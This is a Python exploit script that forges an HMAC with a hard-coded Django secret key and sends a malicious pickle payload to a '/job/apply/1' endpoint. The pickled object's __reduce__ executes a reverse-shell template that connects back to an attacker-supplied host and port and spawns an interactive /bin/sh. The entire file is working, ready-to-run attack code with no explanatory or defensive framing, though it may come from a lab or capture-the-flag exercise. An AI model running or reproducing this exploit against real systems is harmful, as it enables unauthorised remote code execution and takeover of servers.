import argparse
import base64
import hmac
import os
import pickle
import requests
import string

SECRET_KEY = 'django-insecure-d-f*p$uoq36sgv^@kze5m^gc0h_x*9z4$5wpo%i*l15^24xv4c'
FORMSTATE_HMAC_PW = 'formstate:' + SECRET_KEY

REVERSE_SHELL = string.Template(
"""
import socket,subprocess,os
with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
    s.connect(("$lhost",$lport))
    for fd in range(3):
        os.dup2(s.fileno(), fd)
    p=subprocess.call(["/bin/sh","-i"])
"""
)

def parse_args():
    parser = argparse.ArgumentParser('pickle exploit')
    parser.add_argument('--lhost', type=str, required=True)
    parser.add_argument('--lport', type=str, required=True)
    parser.add_argument('--rhost', type=str, required=True)
    parser.add_argument('--rport', type=str, required=True)
    return parser.parse_args()

def main():
    args = parse_args()
    run_exploit(**vars(args))

def run_exploit(lhost, lport, rhost, rport):
    class RCE:
        def __reduce__(self):
            return exec, (REVERSE_SHELL.substitute(lhost=lhost, lport=lport)[1:-1], )

    payload = pickle.dumps(RCE())
    mac = hmac.new(FORMSTATE_HMAC_PW.encode(), payload, 'sha256').digest()
    form_data = {'form_data': base64.b64encode(mac + payload)}
    res = requests.post(f'http://{rhost}:{rport}/job/apply/1', data=form_data)

if __name__ == '__main__':
    main()